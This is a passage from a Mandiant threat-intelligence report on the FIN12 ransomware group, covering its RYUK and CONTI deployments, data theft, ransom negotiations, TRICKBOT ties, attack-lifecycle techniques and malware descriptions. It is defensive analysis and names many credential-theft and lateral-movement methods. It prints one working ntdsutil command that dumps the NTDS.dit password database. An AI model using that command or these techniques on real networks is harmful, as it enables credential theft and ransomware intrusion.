to maintain a foothold in the network. 
•	 In some cases, FIN12 has relied on self-propagation functionality 
built into some variants of RYUK. This has included leveraging 
RYUK's "8 LAN" argument, which enumerates the ARP table 
and attempts to spread to existing network shares as well as a 
RYUK variant that employs compromised domain administrator 
account credentials to spread through the network.
•	 In at least one incident, FIN12 used GPOs, scheduled tasks, and 
WebDAV to execute a RYUK payload hosted on a network file 
share (Figure 13). The WMI script deployment method was also 
observed in this incident.
REPORT  |  MANDIANT  FIN12 Group Profile: FIN12 Prioritizes Speed to Deploy Ransomware Against High-Value Targets
21
Data Theft
While data theft extortion is relatively common in ransomware 
intrusions carried out by other ransomware deployment groups, 
we have observed FIN12 exfiltrate data from victim environments 
in a limited number of instances and only once leverage this data 
for extortion. FIN12's decision to refrain from stealing victim data 
and publicly shaming victims may have multiple explanations, but 
most significantly, the threat actors' probable desire to prioritize 
speed. The average time to ransom (TTR) across our FIN12 
engagements involving data theft was 12.4 days (12 days, 9 hours, 
44 minutes) compared to 2.48 days (2 days, 11 hours, 37 minutes) 
where data theft was not observed. FIN12's apparent success 
without the need to incorporate additional extortion methods 
likely reinforces this notion.
•	 The incident involving data theft extortion is also FIN12's lone 
instance of CONTI ransomware deployment. In this incident, the 
threat actors exfiltrated approximately 90 GB of data to various 
cloud storage providers including filetransfer.io, filemail.net, 
sendspace.com, and dropbox.com. Notably, in the second 
attempt, the victim organization was contacted via Facebook 
Messenger, although we cannot definitively attribute it to FIN12 
due to the mechanism used for communication.
•	 In RYUK incidents with confirmed data theft, we did not 
identify evidence that this data was subsequently leveraged 
for extortion. In these cases, data was exfiltrated to actor-
controlled machines rather than cloud storage providers.
Ransomware Negotiations
Early RYUK ransom notes contained one or two Protonmail email 
addresses for the victim to contact in order to negotiate payment 
for a decryptor (Figure 14). The threat actors managed these email 
communications through an attacker-controlled panel that we 
suspect was likely used to correspond with the victims of multiple 
groups distributing RYUK. Beginning in November 2020, the RYUK 
samples distributed by FIN12 and other groups deploying this 
same malware began to direct users to a victim communication 
portal. This simultaneous transition across intrusion groups to a 
communication portal likely suggests that no one of these groups 
is maintaining RYUK ransomware themselves and they likely have 
common association to a central RYUK developer or service.
•	 Mandiant identified a panel used by threat actors between 
January 2019 and March 2020 to communicate and manage 
ransom negotiations with RYUK victims via ProtonMail accounts 
(20-00005132). We reviewed correspondence with some FIN12 
victims who attempted to negotiate their ransom amount; 
notably, other FIN12 victims may not have appeared within this 
dataset if they chose not to engage the threat actors. 
	– We do not believe that this panel was exclusively used for 
negotiations with FIN12 victims based on the volume of 
negotiations and the identification of other victims whose 
compromises we do not attribute to FIN12. 
•	 After resuming activities in August 2020, samples of RYUK 
distributed by FIN12 continued to leverage ProtonMail email 
addresses in their ransom notes, which may indicate that RYUK 
was still leveraging the same communication panel at this time. 
However, in November 2020, these ransom notes changed to 
include a contact button and a TOR URL, which suggests that a 
new panel was being used for RYUK victim negotiations.

23
Bitcoin Transactions
Mandiant analyzed a limited set of Bitcoin wallet transactions 
that were associated with payments made by FIN12 victims. We 
assess with high confidence that victim payments are split among 
various threat actors, which is consistent with our belief that 
FIN12 leverages initial access providers, and likely other partners, 
to complete all aspects of the attack lifecycle. In several of the 
transactions, a portion of the victim funds were cashed out at 
cryptocurrency exchange services, including Huobi and Binance. 
•	 In multiple cases, we saw evidence of victim payments being 
divided among seemingly disparate Bitcoin wallets. For 
example, in one case, 30–35% of the victim payment was 
subsequently sent to a wallet associated with a suspected initial 
access provider. 
•	 The subdivision of profits after payment is consistent with 
ransomware operations more broadly, where access providers, 
partners with specific skillsets (e.g., penetration testers), and/
or ransomware operators receive a portion of a successful 
ransom payment.
FIN12 Origin
We suspect that FIN12 is likely comprised of Russian-speaking 
actors who may be located in countries in the Commonwealth 
of Independent States (CIS). FIN12 has not targeted CIS-based 
organizations and identified partners, and all currently identified 
RYUK users have spoken Russian. Additionally, GRIMAGENT 
malware, which we have only observed in FIN12 incidents to date, 
contains Russian-language file resources including graphical 
components containing Russian text (Figure 17). These graphical 
resources include a menu that displays an "About" dialog box.
Outlook and Implications
It has become relatively common for actors to specialize 
in specific stages of the attack lifecycle and for groups to 
outsource different aspects of their operations to other 
actors (21-00012276). This trend has been particularly evident 
in ransomware operations in recent years, including those 
conducted by FIN12. Notably, FIN12's reliance on other threat 
actors to obtain initial access to organizations has allowed 
them to focus specifically on ransomware deployment. In 
the first half of 2021, as compared to 2020, FIN12 was able to 
significantly improve their TTR, cutting it in half to just 2.5 days. 
These efficiency gains are likely due at least in part to their 
specialization in a single phase of the attack lifecycle, allowing 
them to develop their expertise more quickly. 
FIN12 has also seemingly made a deliberate choice to prioritize 
speed, as we've rarely observed these threat actors engage in 
data theft extortion. However, it is plausible that these threat 
actors may evolve their operations to more frequently incorporate 
data theft in the future. For example, FIN12 could identify certain 
industries that weigh the threat of data exposure more heavily than 
downtime caused by a ransomware attack and chose to employ this 
tactic against those targets if they are deemed to be of particularly 
high value. Additionally, we are seeing some evidence that FIN12 
has started to work more closely with an increasingly diverse group 
of partners. While observed changes have thus far been limited 
to their use of initial access providers, if FIN12 closely aligns itself 
with another ransomware service that maintains a shaming site, 
these threat actors may begin to incorporate data theft into their 
ransomware operations more frequently. 
Beyond the expansion in initial access vectors leveraged by FIN12, 
we expect their regional targeting to continue to broaden. There 
has been significant attention from the U.S. government on the 
threat posed by ransomware in recent years, resulting in various 
steps curtail the threat including sanctions and the threat of 
future sanctions against threat actors deploying ransomware and 
services used by these actors to facilitate financial transactions. 
This elevated, unwanted attention may make the U.S.-based 
organizations less desirable target for FIN12 who may shift their 
attention to organizations operating in other areas of the world 
including nations in Western Europe and the Asia Pacific region.

Appendix 1: Overlaps with TRICKBOT and Affiliated Actors
FIN12 shares a close working relationship with actors associated 
with the development of TRICKBOT and related families, which 
include BAZARLOADER, BAZARBACKDOOR, and ANCHOR. In 
some cases, it appears that these relationships may lead to 
resource sharing including the use of malware that is atypical for 
FIN12 intrusions. Beyond leveraging accesses obtained via these 
families both FIN12 and TRICKBOT-adjacent activity commonly 
use overlapping toolsets and services including backdoors, 
droppers, and code-signing certificates. Despite these overlaps, 
we track FIN12 as a distinct threat actor given their specific role in 
the deployment of ransomware and their demonstrated ability to 
work independently. 
•	 FIN12 intrusions have frequently followed campaigns delivering 
either TRICKBOT or BAZARLOADER. We have previously 
reported on technical overlaps between the BAZARLOADER 
and BAZARBACKDOOR families with TRICKBOT (20-00007310). 
Notably, these families emerged following TRICKBOT's 
increasing use as a foothold for interactive post-exploitation 
activity, instead of as a traditional banking malware. We believe 
that these loader and backdoor combinations were purposefully 
developed to support this shift. Thus, it is unsurprising that 
after FIN12's reemergence in September 2020, they often 
leveraged accesses obtained from BAZARLOADER instead of 
TRICKBOT. 
•	 Mandiant has only directly observed FIN12 deploy CONTI 
ransomware in one case. Based on information from various 
sources, we have high confidence that the management and 
development staff of CONTI and TRICKBOT are closely aligned 
(21-00011771). Besides the use of CONTI, other TTPs observed 
in the aforementioned incident were consistent with FIN12, 
including leveraging TRICKBOT for initial access. It is plausible 
that given data theft also occurred, FIN12 chose to instead 
deploy CONTI because they maintain a shaming website. 
•	 The ANCHOR backdoor has been seen across a subset of 
intrusions associated with FIN12. We believe it is associated 
with the operators of TRICKBOT based on overlapping C&C 
infrastructure and similarities in HTTP communication with 
TRICKBOT. Further, a CISA alert in October 2020 explicitly stated 
that it was created by the TRICKBOT developers. ANCHOR is 
not distributed widely and appears to be used as a later stage 
backdoor to maintain access to victim environments. We have 
some evidence that FIN12 has been directly responsible for 
its deployment in at least one case, which may suggest that 
they were testing the efficacy of this malware. However, it is 
also possible that in some cases FIN12 could receive access to 
ANCHOR-infected hosts given the existing partnerships they 
maintain with TRICKBOT-affiliated actors. 
•	 FIN12 has used various droppers or crypters that have also 
been used to deliver TRICKBOT and BAZARLOADER among 
other malware (Table 5). Based on information from sensitive 
sources, we believe that the actors behind the development 
and management of TRICKBOT also employ actors who provide 
crypting services to their partners and affiliates.
•	 FIN12 malware payloads are commonly code-signed. In multiple 
instances, FIN12 payloads have shared overlapping code-signing 
certificates with UNC2053, suggesting that both groups may 
rely upon a common actor(s) and/or service for provisioning and 
signing malware payloads (Table 6).
Further, the operators of TRICKBOT have many affiliates 
responsible for the distribution of their malware and maintain 
partnerships with various threat actors who deploy ransomware. 
Mandiant has identified multiple actors operating in underground 
forums who are affiliated with TRICKBOT seeking partners – 
including “pentesters” – for ransomware operations. In one case, 
we identified that the threat actors who used CONTI had access 
to ANCHOR malware and in a separate case, we identified that the 
threat actors who used RYUK (tracked as UNC2840) had access 
to a TRICKBOT administration panel. These instances as well as 
other observations illustrate that there are multiple groups of 
distinct intrusions operators leveraging TRICKBOT and related 
malware within their operations.

Initial Compromise
Based on evidence collected during incident response 
engagements, FIN12 relies on access provided by other threat 
actors and does not operate at the Initial Compromise stage of 
the Attack Lifecycle. 
Establish Foothold
FIN12 relies on access provided by other threat actors. While 
access can be handed off from one threat group to another through 
many different methods, FIN12 intrusion activity has most recently 
started with BEACON or GRIMAGENT payloads being delivered as a 
second stage to other malware or directly via phishing campaigns 
we attribute to malware distribution operations. Early FIN12 
incidents involved use of the EMPIRE post-exploitation framework, 
which was deployed via TRICKBOT. Although we have insufficient 
evidence to attribute any TRICKBOT activity to FIN12, in some of the 
earliest known FIN12 intrusions TRICKBOT was used to progress 
through the establish foothold, internal reconnaissance, lateral 
movement, and maintain presence phases of the attack lifecycle 
prior to the deployment of FIN12 attributed EMPIRE payloads. In 
limited cases, FIN12 has used payloads associated with other post-
exploitation frameworks, including METERPRETER (Metasploit) and 
GRUNT (Covenant).
Escalate Privileges
FIN12 largely relies on access to valid credentials for privilege 
escalation. We have observed the group obtain credentials 
through a variety of methods, including dumping lsass.exe 
memory, extracting password hashes from the NTDS.dit file, 
using various kerberoasting utilities, using the LAZAGNE 
credential stealer, and using credential theft PowerShell cmdlets, 
including Invoke-WCMDump, Get-GPPPassword, and Find-
GPOPasswords. FIN12 has also used process injection to execute 
payloads in a more privileged context. In many cases, these 
tactics were used in conjunction with post-intrusion frameworks 
such as Cobalt Strike, EMPIRE, and Metasploit.
•	 FIN12 has occasionally leveraged the open-source credential 
theft tool LAZAGNE. They have used LAZAGNE with the 
following path and filename on multiple occasions: C:\Windows\
Temp\Gtt654f\lazagne.exe. 
•	 FIN12 has leveraged various publicly available tools to access 
credentials via kerberoasting attacks. These tools have 
included KERBRUTE, RUBEUS, and the Invoke-Kerberoast 
PowerShell cmdlet. KERBRUTE has been observed in the C:\
PerfLogs\ directory with the names k32.exe and k64.exe. 
RUBEUS output has been observed with the filename rubeus_
out.txt.
•	 FIN12 has used various methods to collect the NTDS.dit file 
and the SYSYEM and SECURITY registry hives to gain access to 
password hashes. These methods include creating a Volume 
Shadow Copy and using a batch script named 1.bat, which 
collects NTDS.dit using the Windows ntdsutil utility (Figure 19). 
FIN12 then archives this data for exfiltration. These files have 
been observed in the C:\PerfLogs\1\ and C:\Users\1\ directories. 
•	 FIN12 has dumped the lsass.exe process to access credentials 
in memory. In some cases, we have observed the group 
modifying the WDigest registry key to allow plaintext 
credentials to be cached in memory. The process memory is 
then dumped using the Procdump utility or the Get-Process and 
Out-Minidump PowerShell cmdlets.
ntdsutil "ac in ntds" "ifm" "cr fu C:\
Perflogs\1" q q
FIGURE 19. Example 1.bat contents.
Internal Reconnaissance
FIN12 has almost exclusively used publicly available malware, 
tools, and utilities to perform internal reconnaissance. In many 
cases, these tools and scripts are executed via BEACON or 
EMPIRE. These tools are vital to their operation as they seek 
to elevate their privilege level and identify hosts to target for 
encryption.
•	 FIN12 has frequently used the publicly available AdFind 
Active Directory reconnaissance tool. Specifically, FIN12 has 
staged ZIP archives named adf.zip, which contain an AdFind 
executable, and a batch script named adf.bat. The batch script 
contains commands to execute AdFind in various modes and 
output the contents to text files. 
	– While the use of AdFind and the batch script itself appears 
relatively generic, on multiple occasions we have observed 
FIN12 use a specific version of this batch script, which 
includes a command that is likely a remnant from a previous 
intrusion (Figure 20). 
	– This command referencing a directory that would not exist on 
most hosts would have no impact on its successful execution 
so long as adfind.exe is in the same directory as the script. 
A script containing this error is unlikely to be seen across 
intrusions unless in use by a single threat actor or shared 
between members of the same community by the actor who 
first introduced the error.

27
•	 Get-DataInfo.ps1 is a reconnaissance PowerShell script that has 
been used regularly by FIN12. This script scans the network to 
identify all active hosts, and collects information about them, 
including disk info, installed security software, installed backup 
software, it then archives the results in a ZIP file. Get-DataInfo.
ps1 has been observed in directories named "grub.info.test," 
"grub.info.test2," or "grub.info.test3." This directory has also 
been used to stage files used to launch the script and support 
its functionality (Table 7).
•	 FIN12 has frequently leveraged Microsoft's Get-ADComputer 
PowerShell cmdlet to collect Active Directory data including 
names, DNS hostnames, operating system information, last 
logon dates, and IP addresses. The group has regularly used the 
command shown in Figure 21 to export the collected data to a 
file named AllWindows.csv prior to exfiltration.
•	 FIN12 has used other built-in or publicly available tools for 
Active Directory reconnaissance including BLOODHOUND 
(Invoke-Bloodhound), and the Windows net and nltest 
command line utilities.
•	 Other network reconnaissance tools observed during FIN12 
intrusions include Advanced IP Scanner, MASSSCAN, Nirsoft 
PingInfoView, SoftPerfect Network Scanner, and various 
PowerShell cmdlets. The group also makes regular use of built-
in Windows commands for reconnaissance.

28
Lateral Movement
FIN12 has most commonly moved laterally across victim 
environments using valid credentials in combination with 
BEACON, EMPIRE, RDP, and SMB.
•	 FIN12 has deployed ransomware and other malware using batch 
scripts that leverage PsExec, WMIC, BITSadmin or PowerShell 
to copy and execute payloads on remote machines. 
•	 In some intrusions, FIN12 actors have used RDP to move laterally 
and deploy RYUK interactively.
•	 FIN12 has used the Invoke-SMBExec PowerShell cmdlet to 
execute the pass-the-hash technique using stolen password 
hashes to move laterally.
Maintain Presence
FIN12 has used several tactics to maintain presence in victim 
environments including leveraging valid credentials, built-in malware 
persistence mechanisms, and disabling security software.
•	 FIN12 has used valid credentials for existing Active Directory 
accounts and has also created and used new accounts within 
victims' Active Directory environments.
	– We have observed the group obtain credentials through a 
variety of methods including dumping lsass.exe memory, 
extracting password hashed from the NTDS.dit file, using 
various kerberoasting utilities, using the LAZAGNE credential 
stealer, and using credential theft PowerShell cmdlets 
including Invoke-WCMDump, Get-GPPPassword, and Find-
GPOPasswords. 
	– FIN12 has been observed creating local administrator 
accounts or attempting to change the passwords for existing 
accounts, including service accounts.
•	 FIN12 uses several malware families that incorporate 
mechanisms to persist through reboot, such as the creation of 
scheduled tasks or Windows services.
	– FIN12 has employed Cobalt Strike BEACON, GRIMAGENT, 
ANCHOR, and SYSTEMBC, which may maintain persistence 
through reboot via the creation of scheduled tasks.
	– FIN12 has used EMPIRE configured to maintain persistence 
through reboot via a service named "Updater."
•	 FIN12 has disabled or uninstalled security software.
•	 SYSTEMBC was first observed in use by FIN12 in early 2020 and 
has been seen frequently at their intrusions since their activity 
resumed in September 2020. FIN12's usage of SYSTEMBC is 
often accompanied by some distinctive TTPs. 
	– SYSTEMBC executable files use names containing the strings 
shost, sock, or wav located in the C:\Users\Public\Music\ or 
C:\PerfLogs\ directory. FIN12 has not delivered SYSTEMBC as 
an initial foothold payload, whereas some other threat actors 
have delivered the malware through phishing campaigns.
Complete Mission
At all known intrusions where FIN12 has successfully carried 
out their mission their end goal was almost exclusively the 
deployment of RYUK ransomware. Additionally, we have observed 
at least one instance FIN12 attributed intrusions where they 
deployed CONTI ransomware. The majority of FIN12 intrusions 
have not involved data theft for extortion; however, we have 
observed this in a small number of incidents.
•	 FIN12 has used multiple methods to deploy ransomware in order 
to complete their mission. 
	– Most commonly, ransomware is deployed using a set of scripts 
and text files that copy and execute the ransomware on a list 
of machines collected during the Internal Reconnaissance 
phase on an intrusion. Various scripts have been observed 
that leverage BITSadmin, GPOs, PowerShell, PsExec, and 
WMIC. In some cases, they have used RDP to access domain 
controllers from which they ultimately deploy ransomware.
	– FIN12 has also deployed RYUK manually via RDP. This was 
sometimes done in cases where deployment scripts were 
present but may not have worked as intended.
	– In some cases, FIN12 has relied on self-propagation 
functionality built into RYUK. This has included the use of 
RYUK's "8 LAN" argument, which enumerates the ARP table 
and attempts to spread to existing network shares. They 
have also used a variant of RYUK that used compromised 
domain administrator account credentials to spread through 
a network.
	– FIN12 has also used GPOs, scheduled tasks, and WebDAV to 
execute RYUK payloads hosted on network file shares. 
•	 FIN12 has been observed using WMIC and vssadmin to manually 
delete volume shadow copies. Additionally, FIN12 has used 
CONTI ransomware, which deletes volume shadow copies 
automatically using vssadmin.
•	 In limited instances, FIN12 has been observed exfiltrating stolen 
user data to accounts on various cloud storage providers or 
actor-controlled servers.

BLOODHOUND is a Windows Active Directory reconnaissance utility used to analyze the relationships between permissions, accounts, 
and hosts that could allow for privilege escalation or unintended access to resources.
CONTI
CONTI is ransomware written in C/C++ that encrypts local files. Some variants of CONTI are also capable of encrypting files stored 
on network shares. CONTI may delete volume shadow copies and stop services related to database software, backup solutions, and 
anti-virus prior to encrypting files. Some CONTI samples accept command-line arguments that allow an attacker to specify a mode of 
operation as well as a list of system names or file paths to target for encryption.
DAVESHELL
DAVESHELL is a memory-only launcher that loads and executes an embedded PE-formatted payload.
EMPIRE
EMPIRE is a post-exploitation framework written in PowerShell. EMPIRE is commonly used to generate a stager payload, which is 
responsible for downloading and executing the framework's backdoor. The backdoor communicates via HTTP and HTTPS. Supported 
backdoor commands include shell command execution, PowerShell execution, and file transfer. The EMPIRE backdoor can also be 
extended via plugins. Supported plugins include remote desktop, screenshot capture, keylogging, lateral movement, credential theft, and 
reconnaissance.
GRIMAGENT
GRIMAGENT is a backdoor that can execute arbitrary commands, download files, create and delete scheduled tasks, and execute 
programs via scheduled tasks or via the ShellExecute API. The malware persists via a randomly named scheduled task and a registry Run 
key. The backdoor communicates to hard-coded C&C servers via HTTP requests with portions of its network communications encrypted 
using both asymmetric and symmetric cryptography.
GRUNT
Grunt is a multi-stage .NET implant that communicates with the Covenant command and control framework.
ICECANDLE
ICECANDLE is a memory-only dropper that uses the RC4 algorithm to decrypt its payload prior to execution. ICECANDLE leverages the 
DAVESHELL shellcode launcher.
MALTSHAKE
MALTSHAKE is a multi-stage, in-memory dropper written in C++ that executes an embedded payload in memory. MALTSHAKE has 
exclusively been observed in activity that we attribute to FIN12.
RYUK
RYUK is ransomware written in C that encrypts files stored on local drives and network shares. It also deletes backup files and volume 
shadow copies. Some RYUK variants can propagate to other systems on a network.
METERPRETER
METERPRETER is a backdoor written in C that communicates via HTTP, HTTPS, or a custom binary protocol over TCP. Supported 
commands include reverse shell, file transfer, file execution, keylogging, and screenshot capture. METERPRETER is generated by the 
METASPLOIT framework.
SYSTEMBC
SYSTEMBC is a tunneler written in C that retrieves proxy-related commands from a C&C server using a custom binary protocol over TCP. 
A C&C server directs SYSTEMBC to act as a proxy between the C&C server and a remote system. SYSTEMBC is also capable of retrieving 
additional payloads via HTTP. Some variants may use the Tor network for this purpose. Downloaded payloads may be written to disk or 
mapped directly into memory prior to execution. SYSTEMBC is often used to hide network traffic associated with other malware families.
WEIRDLOOP
WEIRDLOOP is an in-memory dropper that decodes a payload encoded via stack strings and executes it in memory.
WHITEDAGGER
WHITEDAGGER is a memory-only dropper written in C/C++ that uses RC4 stream cipher to decrypt an embedded payload to execute it in 
memory. WHITEDAGGER leverages the DAVESHELL shellcode launcher.

Appendix 5: YARA Rules
The following YARA rules are not intended to be used on production systems or to inform blocking rules without first being validated 
through an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives. These 
rules are intended to serve as a starting point for hunting efforts to identify samples, however, they may need adjustment over time.
